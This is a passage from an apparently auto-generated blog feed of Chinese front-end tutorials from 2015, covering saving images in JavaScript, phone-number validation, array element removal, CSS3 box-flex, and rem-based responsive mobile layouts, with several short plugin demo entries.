    <content type="text"><![CDATA[下面是保存一个图片为示例，代码来源于网络，希望能够给大家带来一定的帮助，代码如下:123456789101112131415161718&lt;script type="text/javascript"&gt;function saveFile(imgUrl)&#123;var oPop=window.open(imgUrl,"","width=1, height=1, top=5000, left=5000");for(;oPop.document.readyState != "complete"; )&#123;if(oPop.document.readyState=="complete")break;&#125;oPop.document.execCommand("SaveAs");oPop.close();&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;img src="../mytest.jpg" id="theimage" border="0"&gt;&lt;a href="#" onclick="saveFile(document.getElementById('theimage').src)"&gt; 点击这里下载图片 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js将文件保存到本地</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机号码和电话号码合法性验证代码]]></title>
    <url>%2F2015%2F07%2F25%2F%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%A0%81%E5%92%8C%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E5%90%88%E6%B3%95%E6%80%A7%E9%AA%8C%E8%AF%81%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在某些网站电话号码和手机号码都是必填的，或者说需要填写其中的一项，为了增强网站的真实性也提高用户体验，一般需要进行进行格式合法性验证，下面是摘自网络上的一段验证代码供大家参考之用，希望能够给大家带来一定的帮助。1234567891011121314151617181920212223242526272829303132333435363738394041function Checkreg()&#123;//验证电话号码手机号码，包含153，159号段if(document.form.phone.value==""&amp;amp;&amp;amp;document.form.UserMobile.value=="")&#123;alert("电话和手机号码至少选填一项！");document.form.phone.focus();return false;&#125;if(document.form.phone.value != "")&#123;var phone=document.form.phone.value;var p1=/^(([0\+]\d&#123;2,3&#125;-)?(0\d&#123;2,3&#125;)-)?(\d&#123;7,8&#125;)(-(\d&#123;3,&#125;))?$/;var me=false;if(p1.test(phone))&#123;me=true;&#125;if(!me)&#123;document.form.phone.value='';alert('对不起，您输入的电话号码有错误。区号和电话号码之间请用-分割');document.form.phone.focus();return false;&#125;&#125;if(document.form.UserMobile.value != "")&#123;var mobile=document.form.UserMobile.value;var reg0=/^13\d&#123;5,9&#125;$/;var reg1=/^153\d&#123;4,8&#125;$/;var reg2=/^159\d&#123;4,8&#125;$/;var reg3=/^0\d&#123;10,11&#125;$/;var my=false;if(reg0.test(mobile))my=true;if(reg1.test(mobile))my=true;if(reg2.test(mobile))my=true;if(reg3.test(mobile))my=true;if(!my)&#123;document.form.UserMobile.value='';alert('对不起，您输入的手机或小灵通号码有错误。');document.form.UserMobile.focus();return false;&#125;return true;&#125;&#125;以上代码可以实现电话号码和手机号码格式合法性验证效果。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>手机号码验证</tag>
        <tag>电话号码验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript如何删除数组中指定的元素]]></title>
    <url>%2F2015%2F07%2F24%2Fjavascript%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4%E6%95%B0%E7%BB%84%E4%B8%AD%E6%8C%87%E5%AE%9A%E7%9A%84%E5%85%83%E7%B4%A0%2F</url>
    <content type="text"><![CDATA[本章节将通过实例简单介绍一下如何删除数组中的元素，希望给需要的朋友带来帮助。删除数组元素的方式有多种，下面简单介绍一下常用的几种方式:一、使用delete进行删除:代码实例如下:123456var myArray=new Array()myArray[0]="蚂蚁部落";myArray[1]="青岛";myArray[2]="奋斗才会有美好的未来";delete myArray[1]alert(myArray.length);以上代码可以删除数组第二个元素的内容，但是数组的长度和原来的索引都没有发生变化。myArray[1]值变为undefined。二、使用splice()函数删除:语法格式:1arrayObject.splice(index,howmany)此函数可以从指定位置开始删除指定数目的数组元素。index表示开始删除的数组元素索引，howmany规定要删除的数目。代码实例如下:123456var myArray=new Array()myArray[0]="蚂蚁部落";myArray[1]="青岛";myArray[2]="奋斗才会有美好的未来";myArray.splice(0,1);alert(myArray.length);以上代码可以删除数组中的第一个元素，并且弹出现在数组的长度。三、自定义方式删除数组元素:123456789101112131415161718192021Array.prototype.remove=function(dx)&#123; if(isNaN(dx)||dx&gt;this.length) &#123; return false; &#125; for(var i=0,n=0;i&lt;this.length;i++) &#123; if(this[i]!=this[dx]) &#123; this[n++]=this[i] &#125; &#125; this.length-=1&#125;var myArray=new Array()myArray[0]="蚂蚁部落";myArray[1]="青岛";myArray[2]="奋斗才会有美好的未来";myArray.remove(1);alert(myArray.length);以上代码可以删除索引值为1的数组元素，并且弹出当前数组的长度。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js删除数组指定元素</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3 box盒子模型以及box-flex的使用]]></title>
    <url>%2F2015%2F07%2F24%2Fcss3-box%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B%E4%BB%A5%E5%8F%8Abox-flex%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[display:box;box-flex是css3新添加的盒子模型属性，它的出现可以解决我们通过N多结构、css实现的布局方式。经典的一个布局应用就是布局的垂直等高、水平均分、按比例划分。一、使用以及介绍：1、要实现水平或者垂直切分，必须先满足以下要求display : box必须用在对应的父窗口，比如div.parent&gt;div.panel*3 这种格局， parent 必须先先定义此属性切分。如下图：就是将三个div水平切分成6份1234.parent&#123;display:box or -moz-box or -wekit-box&#125;.panel1&#123;box-flex : 1&#125;;.panel2&#123;box-flex : 2&#125;;.panel3&#123;box-flex : 3&#125;;上面罗列的是一个简单的例子，在这个基础上我们如果想垂直布局呢，理论上按我们现在的布局去理解的话就是div.panel1+div.panel2+div.panel3 这种方式也可以，但我们今天考虑到box这个，所以下面用box来实现这个2、垂直布局的话涉及到另外一个属性：box-orient(父元素上) : 这个属性有以下几个值horizontal //水平vertical // 垂直inline-axis //也算是水平block-axis//也算是垂直，跟垂直没有什么区别inherit // 水平，垂直PS : 当设置了水平(horizontal)或者 inline-axis 的话，如果父容器设置了高度，子容器的高度会跟父容器保持一致（即时子容器设置了高度也无效）。如果父容器不设置高度值，其子容器的高度值才有效并且取最大高度值的子容器的高度。同理，如果设置了垂直(vertical) or block-axis 父容器设置了宽度的话，子容器设置宽度会无效。如果父容器不设置宽度值，其子容器的宽度值才有效并且取最大宽度值的子容器的宽度现在水平排版垂直排版都没有问题了，但是我有时候想实现凹凸的水平布局（如：中间突出a，两边登高b,c）或者凹凸垂直布局，这种的话，那怎么弄呢？需要这样子的话，当然就不能用上面所说的box-orient啦，这样子的话盒子里面的宽高都可以不同那我们能否实现bc模块与a模块垂直对齐，水平对齐呢？3、那我们就可以用到这个属性：box-align（用在父元素上）： 其有以下属性值start // 理解为valign = top 以顶部对齐,end //理解为 valign = bottom 以底部对齐center // 理解为 valign = center 以居中对齐baseline //理解为以某一个元素的基准线进行对齐，stretch(默认值)//以最大的一块的高度或者宽度拉伸,以哪个方位进行拉伸取决于你是水平对齐还是垂直对齐,如果子容器没有定义高度则以父容器的宽度或者高度拉伸PS当父容器有宽度高度的时候1、如果是水平切分，设置box-align的值不等于stretch(拉伸)的时候，内容的子容器的高度不再是父容器的高度，而变成了自身的高度了。比如说父容器height:200px, 子容器没有设置高度, 设置此属性的时候，子容器的高度变成自身的高度2、如果是水平切分，设置box-align的值不等于stretch(拉伸)的时候，内容的子容器的高度不再是父容器的高度，而变成了自身的高度了。比如说父容器height:200px, 子容器没有设置高度, 设置此属性的时候，子容器的高度变成自身的高度4、box-pack表示父容器里面子容器的水平对齐方式，可选参数如下所示，此参数要生效的话前提条件是： 子容器的总长度&lt;父容器的宽度，这个设置才能起效（自己写的demo出来的结果）start 代表向左对齐end 代表向右对齐，类似与float:rightcenter 居中对齐， 类似div.设定了宽度，然后margin: 0 autojustify : 就是自适应撑开到父容器的宽度二、常见问题总结1、要实现某一块宽度定死，那这个布局是怎么布的呢，结果又是什么，如下demo1234.parent&#123;display:box or -moz-box or -wekit-box&#125;.panel1&#123;box-flex : 1&#125;;.panel2&#123;box-flex : 2;width:200px&#125;;.panel3&#123;box-flex : 3&#125;;这样子写的话（既有比例区分，又有精确的宽度的话，比例无效） 这时候中间这块永远都是200px，两边的两块根据父容器宽度-200px 在进行比例切分,这个也符合我们的要求。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>box-flex</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery分页插件带总数分页代码]]></title>
    <url>%2F2015%2F07%2F24%2Fjquery%E5%88%86%E9%A1%B5%E6%8F%92%E4%BB%B6%E5%B8%A6%E6%80%BB%E6%95%B0%E5%88%86%E9%A1%B5%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[jquery根据总页数进行分页操作，因没有连接地址，下载后自然可以使用&nbsp;查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>分页代码</tag>
        <tag>分页插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery(3d)幻灯片插件图片层叠加按钮控制图片大小缩放切换]]></title>
    <url>%2F2015%2F07%2F24%2Fjquery3d%E5%B9%BB%E7%81%AF%E7%89%87%E6%8F%92%E4%BB%B6%E5%9B%BE%E7%89%87%E5%B1%82%E5%8F%A0%E5%8A%A0%E6%8C%89%E9%92%AE%E6%8E%A7%E5%88%B6%E5%9B%BE%E7%89%87%E5%A4%A7%E5%B0%8F%E7%BC%A9%E6%94%BE%E5%88%87%2F</url>
    <content type="text"><![CDATA[jquery(3d)幻灯片插件制作图片层叠加效果，设置左右按钮控制图片大小缩放切换效果，支持索引按钮控制图片切换的幻灯片插件。下载案例可以修改ID，会有不同的效果哦~&nbsp;查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>3d幻灯片</tag>
        <tag>图片层叠加幻灯片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery公司发展时间插件]]></title>
    <url>%2F2015%2F07%2F24%2Fjquery%E5%85%AC%E5%8F%B8%E5%8F%91%E5%B1%95%E6%97%B6%E9%97%B4%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq公司发展时间插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无js中国地图变色版]]></title>
    <url>%2F2015%2F07%2F24%2F%E6%97%A0js%E4%B8%AD%E5%9B%BD%E5%9C%B0%E5%9B%BE%E5%8F%98%E8%89%B2%E7%89%88%2F</url>
    <content type="text"><![CDATA[查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>无js中国地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“DESIGN SAMSUNG”瀑布流，页面滚动内容加载效果]]></title>
    <url>%2F2015%2F07%2F24%2Fdesign-samsung%E7%80%91%E5%B8%83%E6%B5%81%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%BB%9A%E5%8A%A8%E5%86%85%E5%AE%B9%E5%8A%A0%E8%BD%BD%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[如果你曾今访问过Design Samsung网站，那么你一定已经见识过这种神奇的效果了。彩色的背景先从左边滑出，随后图片再在其上左边从滑出，彩色的背景代表了图片的主要色彩（某张图片的主导颜色）。这是一个非常有创意的图片懒加载效果。注意：这些效果在现代浏览器中有效。查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>DESIGN SAMSUNG 瀑布流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用rem设置文字大小]]></title>
    <url>%2F2015%2F07%2F24%2F%E4%BD%BF%E7%94%A8rem%E8%AE%BE%E7%BD%AE%E6%96%87%E5%AD%97%E5%A4%A7%E5%B0%8F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;由于最近在做移动方面的重构项目，大量的运用到了rem的单位值，深深的感觉到rem这个单位的强大，所以在这里推荐一篇淘宝的文章给大家了解下rem的一些基本用法。后续我还会出一篇关于rem更多的使用方法的文章分享给大家。&emsp;&emsp;响应式网页不仅仅是响应不同类型的设备，而且需要响应不同的用户需求。响应式的初衷是为了让信息更好的传递交流，让所有人无障碍的获取信息，同时这也是 Web 的初衷。&emsp;&emsp;序言中同样提到，响应式的设计应该秉承「内容优先，移动优先」的设计原则，那么我们知道网页中的内容主要是由文字图片等元素组成的，那么文字该如何响应式呢？&emsp;&emsp;当我们每天面对缤纷的互联网世界的时候，文字不仅仅传递给我们众多的信息资讯，而且在设计师的手里，文字在网页中的排版承载着一种艺术的直觉。&emsp;&emsp;网页中常用的文字大小单位是 px(Pixels)，em，现在《CSS Values and Units Module Level 3》中新增了 rem 这个单位。一、那到底什么是 rem 呢？规范中明确写道：Equal to the computed value of ‘font-size’ on the root element.「rem」是指根元素（root element，html）的字体大小，好开心的是，从遥远的 IE6 到版本帝 Chrome 他们都约好了，根元素默认的 font-size 都是 16px。这样一个新的单位兼容性如何呢？&emsp;&emsp;太好了，IE9+，Firefox、Chrome、Safari、Opera 的主流版本都支持了，我可以放肆的使用 rem 了。&emsp;&emsp;可是，W3C 那些家伙为什么要闲着下面疼的新增这样一个单位呢？它和 em 有啥区别呢？&emsp;&emsp;我们知道 em 的计算是基于父级元素的，在实际使用中给我们的计算带来了很大的不便。所以 rem 的出现解救了我这样不会算术的人，再也不用担心父级元素的 font-size 了，因为它始终是基于根元素（html） 的。&emsp;&emsp;比如默认的 html font-size=16px，那么我想设置12px 的文字就是：12÷16=0.75（rem）&emsp;&emsp;当然，你可以引入 CSS 预处理工具（Sass、LESS 、Stylus等）自动计算 rem 值，这里就不一一举例了。&emsp;&emsp;但是像我这样的懒人或者团队开发中还没有引入 CSS 预处理工具的该肿么办呢？只能搬个计算器啪啪啪了吗？别急，你还可以变通一下。我们改变一下 html 的默认 font-size=10px 不就好计算了嘛！Like this：1234567891011html&#123; font-size:62.5%; /* 10÷16=62.5% */&#125;body&#123; font-size:12px; font-size:1.2rem ; /* 12÷10=1.2 */&#125;p&#123; font-size:14px; font-size:1.4rem;&#125;&emsp;&emsp;需要注意的是，为了兼容不支持 rem 的浏览器，我们需要在 rem 前面写上对应的 px 值，这样不支持的浏览器可以优雅降级。其实不用太纠结是默认的 font-size:100%，还是设置为 font-size:62.5%，如果你引入了 CSS 预处理工具那么自然可以使用默认值，如果由于其他原因使用 font-size:62.5% 也无可厚非，完全可以在 body 中重置回你需要的默认 font-size。二、为啥要用 rem 呢？黑夜给了我黑色的眼睛，我将用它寻找关怀。&emsp;&emsp;浏览器中用户都是可以自定义默认的文字大小的，如果使用 px，用户自行在浏览器设置中改变了文字大小后，网页上是不会变化的。我们不能排除视障用户（如近视）、老年用户不会这么做，作为一个具有「人文关怀」的前端，我们完全可以考虑这些情况。由其是在引入了 CSS预处理工具之后，这几乎不会增加什么成本。&emsp;&emsp;也再次印证前面提到的：响应式网页不仅仅是响应不同类型的设备，而且需要响应不同的用户需求。各个浏览器的设置方法如下：IE浏览器：按下 Alt 键，打开菜单栏→查看→字体大小Chrome 浏览器：设置→显示高级设置→网页内容Firefox 浏览器：按下 Alt 键，打开菜单栏→工具→选项→内容选项卡其他浏览器就不一一举例了……三、什么时候用 rem？&emsp;&emsp;既然 rem 的可用性更好，是不是在所有地方都去使用呢？别捉急，通常在标题，正文等大面积文字的位置可以使用 rem。但是在一些特殊的设计场景，rem 可能会导致布局错位，比如这样一个回顶部的按钮：&emsp;&emsp;所以，什么时候用 rem，如何用好 rem？ 这也需要你拿出 18K的黑色乌金睛来照亮整个页面。让我们一起：抛开布局，响应文字；抛开成见，响应内心。在面对响应式开发的时候，什么才是合适的，什么是不合适的，你真的想好了吗？&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>rem设置字体大小</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用rem做响应式开发]]></title>
    <url>%2F2015%2F07%2F24%2F%E7%94%A8rem%E5%81%9A%E5%93%8D%E5%BA%94%E5%BC%8F%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;一般移动端项目最大的宽度限制是640px,最小限制是320px,大家可以改变浏览器的分辨率或者通过手机访问看看效果。基本上在不同分辨率下都是差不多的展示效果，而且在手机移动终端下都是100%的撑开。这种响应式的效果，我想应该是最符合现在移动终端多样化的需求的，如果只是做几个特别适应的尺寸，例如320、480、340、600这种特定的尺寸，那真是要累死前端开发的同学了。但是如果用rem来实现就可以不用考虑上诉的问题也可以达到自适应了。&emsp;&emsp;这个效果对设计师的要求也是非常严格的，例如你需要指定一个规范的宽度进行设计，我们的设计师是按照640的宽度去设计的，实际设计图的宽度是640*2这样做的目的是为了在移动端能高清显示。小图标是采用CSS3的图标字体，不得不说这是个非常好的东西。设置对应的响应式的html rem比例&emsp;&emsp;我们平常在使用长度单位都会使用px，但是在做上面的响应式的时候，需要用rem或者百分比的单位，大家可以看我的Demo代码。在上篇文章介绍了rem的字体设置计算方法：1234567891011html&#123; font-size:62.5%; /* 10÷16=62.5% */&#125;body&#123; font-size:12px; font-size:1.2rem ; /* 12÷10=1.2 */&#125;p&#123; font-size:14px; font-size:1.4rem;&#125;&emsp;&emsp;通过设置html的font-size值来控制全局的rem输出，这段代码其实是这个rem的精髓所在，我在我的页面中设置了如下的代码来控制不同设备下的字体大小显示使其达到自适应：12345678910111213141516171819html &#123; font-size: 62.5%;&#125;@media only screen and (min-width: 481px)&#123; html &#123; font-size: 94%!important; &#125;&#125;@media only screen and (min-width: 561px)&#123; html &#123; font-size: 109%!important; &#125;&#125;@media only screen and (min-width: 641px)&#123; html &#123; font-size: 125%!important; &#125;&#125;看上面的代码，可能大家会觉得为什么要这样设置呢，其实这个是根据许多测试推算出来的，上面代码如果要转换城px会变成这样：12345678910111213141516171819html &#123; font-size: 62.5%; /* 10÷16=62.5% */&#125;@media only screen and (min-width: 481px)&#123; html &#123; font-size: 94%!important; /* 15.04÷16=94% */ &#125;&#125;@media only screen and (min-width: 561px)&#123; html &#123; font-size: 109%!important; /* 17.44÷16=109% */ &#125;&#125;@media only screen and (min-width: 641px)&#123; html &#123; font-size: 125%!important; /* 20÷16=125% */ &#125;&#125;给margin padding 设置rem&emsp;&emsp;上面展示的是怎么通过计算获取到不同分辨率下的html font-site百分比的值。实际开发如果设计师是按照640的宽度去设计的，我们就按照最大的640去切图，切图的时候如果我们要设置margin怎么banner，设计图的值加入是10px的间距，我们通过640的比例去计算：12margin-top:.5rem; /*10 ÷ 20 = 0.5*/padding-top:1rem /* 20 ÷ 20 =1 */上面分别是设计图上的间距10px和20px计算成rem的方法，大家可以以此类推，如果你的设计图是640设计的就可以用上面的方法，反正每次以最大的值来计算就可以了。给height width 设置rem&emsp;&emsp;实际开发中大家最常设置的估计就是height width值了，为了做到各个设备下长度自己相应，许多开发人员会用百分比来做，这个是没有问题，但是其实很多场景下用rem比百分比更加灵活，在我实际开发中，一般我只在大块的div布局里面用百分比，元素的设置一般都用rem来。例如：12height:100px; /* 100 ÷ 20 = 5rem;*/width:50px; /* 50 ÷ 20 = 2.5rem;*/给border 设置rem&emsp;&emsp;其实就连border我们也可以用rem来做，但是貌似现在的安卓手机对border用rem单位有一小部分不支持，在我开发测试发现了，高版本的安卓浏览器支持，但是低版本的有许多都不支持，具体要不要使用就看你们自己的情况。1order:.2rem solid #cccccc;总结&emsp;&emsp;rem的使用其实我可能是只是总结了大家比较常用的一些属性，其实他的范围肯定不止是这么多，实际的项目开发中我相信大家在使用他的过程会发现许多惊喜的，非常希望大家留言讨论这一章的内容。有什么问题我会第一时间反馈。强烈推荐这篇文章[《详解移动端rem变革》]]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>rem响应式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解移动端rem变革]]></title>
    <url>%2F2015%2F07%2F24%2Fweb-app-%E5%8F%98%E9%9D%A9%E4%B9%8Brem%2F</url>
    <content type="text"><![CDATA[rem这是个低调的css单位，近一两年开始崭露头角，有许多同学对rem的评价不一，有的在尝试使用，有的在使用过程中遇到坑就弃用了。但是我对rem综合评价是用来做web app它绝对是最合适的人选之一。rem是什么？rem（font size of the root element）是指相对于根元素的字体大小的单位。简单的说它就是一个相对单位。看到rem大家一定会想起em单位，em（font size of the element）是指相对于父元素的字体大小的单位。它们之间其实很相似，只不过一个计算的规则是依赖根元素一个是依赖父元素计算。为什么web app要使用rem？这里我特别强调web app，web page就不能使用rem吗，其实也当然可以，不过出于兼容性的考虑在web app下使用更加能突显这个单位的价值和能力接下来我们来看看一些企业的web app是怎么做屏幕适配的。1、实现强大的屏幕适配布局：最近iphone6一下出了两款尺寸的手机，导致的移动端的屏幕种类更加的混乱，记得一两年前做web app有一种做法是以320宽度为标准去做适配，超过320的大小还是以320的规格去展示，这种实现方式以淘宝web app为代表作，但是近期手机淘宝首页进行了改版，采用了rem这个单位，首页以内依旧是和以前一样各种混乱，有定死宽度的页面，也有那种流式布局的页面。我们在在作页面布局的使用常用的单位是px，这是一个绝对单位，web app的屏幕适配有很多中做法，例如：流式布局、限死宽度，还有就是通过响应式来做，但是这些方案都不是最佳的解决方法。例如流式布局的解决方案有不少弊端，它虽然可以让各种屏幕都适配，但是显示的效果极其的不好，因为只有几个尺寸的手机能够完美的显示出视觉设计师和交互最想要的效果，但是目前行业里用流式布局作web app的公司非常多，看看下面我收集的一些案例：1.亚马逊：2.携程：3.兰亭上面的网站都是采用的流式布局的技术实现的，他们在页面布局的时候都是通过百分比来定义宽度，但是高度大都是用px来固定住，所以在大屏幕的手机下显示效果会变成有些页面元素宽度被拉的很长，但是高度还是和原来一样，实际显示非常的不协调，这就是流式布局的最致命的缺点，往往只有几个尺寸的手机下看到的效果是令人满意的，其实很多视觉设计师应该无法接受这种效果，因为他们的设计图在大屏幕手机下看到的效果相当于是被横向拉长来一样。流式布局并不是最理想的实现方式，通过大量的百分比布局，会经常出现许多的bug，还有就是对设计师的设计有很多的限制，因为他们在设计之初就需要考虑流式布局，只能设计横向拉伸的元素布局，设计的时候存在很多局限性。2.固定宽度做法还有一种是固定页面宽度的做法，早期有些网站把页面设置成320的宽度，超出部分留白，这样做视觉，前端都挺开心，视觉在也不用被流式布局限制自己的设计灵感了，前端也不用在搞坑爹的流式布局。但是这种解决方案也是存在一些问题，例如在大屏幕手机下两边是留白的，还有一个就是大屏幕下看起来页面会特别小，手机淘宝首页起初是这么做的，但近期改版了，可是天猫首页还没改版。&nbsp;3.响应式做法响应式这种方式在国内很少有大型企业的复杂性的网站在移动端用这种方法去做，主要原因是工作大，维护性难，所以一般都是中小型的门户或者博客类站点会采用响应式的方法从web page到web app直接一步到位，因为这样反而可以节约成本，不用再专门为自己的网站做一个web app的版本。4.设置viewport进行缩放``12345678910111213141516171819202122232425天猫的web app的首页就是采用这种方式去做的，以320宽度为基准，进行缩放，最大缩放为320*1.3 = 416，基本缩放到426都就可以兼容iphone6 plus的屏幕了，这个方法简单粗暴，又高效。说实话我觉得他和用接下去我们要讲的rem都非常高效，不过有部分同学使用过程中反应缩放过程中有些糊，具体我使用没怎么遇到过这种情况。## rem能等比例适配所有屏幕上面讲了一大堆目前大部分公司主流的一些web app的适配解决方案，接下来讲下rem是如何工作的。上面说过rem是通过根元素进行适配的，网页中的根元素指的是html我们通过设置html的字体大小就可以控制rem的大小。举个例子：```csshtml&#123; font-size:20px;&#125;.btn &#123; width: 6rem; height: 3rem; line-height: 3rem; font-size: 1.2rem; display: inline-block; background: #06c; color: #fff; border-radius: .5rem; text-decoration: none; text-align: center; &#125;上面代码结果按钮大小如下图：我把html设置成10px是为了方便我们计算，为什么6rem等于60px。如果这个时候我们的.btn的样式不变，我们再改变html的font-size的值，看看按钮发生上面变化:123html&#123; font-size:40px;&#125;按钮大小结果如下：上面的width，height变成了上面结果的两倍，我们只改变了html的font-size，但.btn样式的width,height的rem设置的属性不变的情况下就改变了按钮在web中的大小。其实从上面两个案例中我们就可以计算出1px多少rem:第一个例子：120px = 6rem * 20px(根元素设置大值)第二个例子：240px = 6rem * 40px(根元素设置大值)推算出：10px = 1rem 在根元素（font-size = 10px的时候）；20px = 1rem 在根元素（font-size = 20px的时候）；40px = 1rem 在根元素（font-size = 40px的时候）；在上面两个例子中我们发现第一个案例按钮是等比例放大到第二个按钮，html font-size的改变就会导致按钮的大小发生改变，我们并不需要改变先前给按钮设置的宽度和高度，其实这就是我们最想看到的，为什么这么说？接下来我们再来看一个例子：由上面两个的demo中我们知道改变html的font-size可以等比改变所有用了rem单位的元素，所以大家可以通过chrome浏览器的调试工具去切换第三个的demo在不同设备下的展示效果，或者通过缩放浏览器的宽度来查看效果，我们可以看到不管在任何分辨率下，页面的排版都是按照等比例进行切换，并且布局没有乱。我只是通过一段js根据浏览器当前的分辨率改变font-size的值，就简单的实现了上面的效果，页面的所有元素都不需要进行任何改变。到这里肯定有很多人会问我是怎么计算出不同分辨率下font-size的值？&nbsp;首先假设我上面的页面设计稿给我时候是按照640的标准尺寸给我的前提下，（当然这个尺寸肯定不一定是640，可以是320，或者480，又或是375）来看一组表格。上面的表格蓝色一列是Demo3中页面的尺寸，页面是以640的宽度去切的，怎么计算不同宽度下font-site的值，大家看表格上面的数值变化应该能明白。举个例子：384/640 = 0.6，384是640的0.6倍，所以384页面宽度下的font-size也等于它的0.6倍，这时384的font-size就等于12px。在不同设备的宽度计算方式以此类推。&nbsp;Demo3中我是通过JS去动态计算根元素的font-size，这样的好处是所有设备分辨率都能兼容适配，淘宝首页目前就是用的JS计算。但其实不用JS我们也可以做适配，一般我们在做web app都会先统计自己网站有哪些主流的屏幕设备，然后去针对那些设备去做media query设置也可以实现适配，例如下面这样：12345678910111213141516171819202122232425262728html &#123; font-size : 20px;&#125;@media only screen and (min-width: 401px)&#123; html &#123; font-size: 25px !important; &#125;&#125;@media only screen and (min-width: 428px)&#123; html &#123; font-size: 26.75px !important; &#125;&#125;@media only screen and (min-width: 481px)&#123; html &#123; font-size: 30px !important; &#125;&#125;@media only screen and (min-width: 569px)&#123; html &#123; font-size: 35px !important; &#125;&#125;@media only screen and (min-width: 641px)&#123; html &#123; font-size: 40px !important; &#125;&#125;上面的做的设置当然是不能所有设备全适配，但是用JS是可以实现全适配。具体用哪个就要根据自己的实际工作场景去定了。下面推荐两个国内用了rem技术的移动站，大家可以上去参考看看他们的做法，手机淘宝目前只有首页用了rem，native app的首页是内嵌的web app首页。淘宝首页：m.taobao.comD X：m.dx.com最后我们再来看一看他的兼容性：]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>rem布局</tag>
        <tag>移动端rem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端适配屏幕解决方案]]></title>
    <url>%2F2015%2F07%2F24%2F%E6%89%8B%E6%9C%BA%E7%BD%91%E9%A1%B5%E9%80%82%E9%85%8D%E5%B1%8F%E5%B9%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;各位童鞋们可以打开以下链接http://m.taobao.com/?qq-pf-to=pcqq.c2c对，这就是淘宝的手机网页。看着没什么吧，但是仔细斟酌，里面还是有很多设计细节，技术细节的。咱，先不说别的，就说说适配吧。源码什么的，自己找去，我只说思路。解决思路：使用rem单位，rem简单说就是root em啦。相比大家都知道em单位是什么意思。那么rem就是相对于“根元素”的大小来设置所有设置了rem的地方。怎么理解呢，比如12345678html&#123;font-size:24px;&#125;div&#123;width:1.5rem;height:1rem;&#125;那么狠容易得出，width=1.524=36px；height=124 = 24px；&emsp;&emsp;那么问题来了，html的font-size现在是固定的。然而这并没什么卵用。我们需要的是根据屏幕大小来设置这个font-size好的那么现在说回淘宝怎么做的？简单思路：1.写一个js去根据屏幕大小去计算控制html的font-size大小。淘宝的做法是，font-size = 屏幕宽度/16.为什么要用16呢？这么操蛋的数字，有时候还会除不尽呢。为什么不用20呢？我不得而知，然后搞笑的事情发生了，我也用了16，抄是一种本能。也就是百分之百的宽度是16rem。看淘宝网页上都是16rem，就不言而喻了。2.所有元素的宽高都使用rem来设定，关于字体，设置为固定的大小为px就可以了，我现在的做法是，小屏幕字体大小为12px，大屏幕字体大小是14px。3.淘宝还根据devicePixelRatio做了屏幕倍数处理，见html 的属性data-dpr = 1|2|3，自己去看了，公司把淘宝网站屏蔽了（每一个互联网公司都不该这么做，我们要的是open and freedom），而其实个人觉得，用我们标准的html&lt;meta content=&quot;initial-scale=1,maximum-scale=1,user-scalable=no,width=device-width&quot; name=&quot;viewport&quot;/&gt;1倍去做，是没有什么问题滴。==优点：==屏幕大小改变，html的font-size大小随之改变，整个布局也随之改变。做到自适应了撒。该大的时候大，该小的时候小。==缺点：==1.对于数学不好的人来说，他觉得难以计算。2.要做一次js的计算来控制font-size大。3.可能会损失一点点精度，做css&emsp;&emsp;sprite的时候理论上是有问题的。不过经过努力的测试，感觉还是可以的，只不过我不大喜欢用rem还用sprite。&emsp;&emsp;那么还有一个问题，哥哥，这个方式是网页的，那么在安卓和IOS的webview里可不可以嵌入进去而会存在兼容问题吗？傻了吧，当然可以啊。ios和安卓4.4以后的webview和机器自带的浏览器是一样一样的，安卓低版本可能有点点不一样具体还需要自己去亲手测试，不过就目前我测试过来（测试过最低版本小米1，安卓4.1版本），还没发现这种rem布局有出过什么问题。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>手机网页适配屏幕</tag>
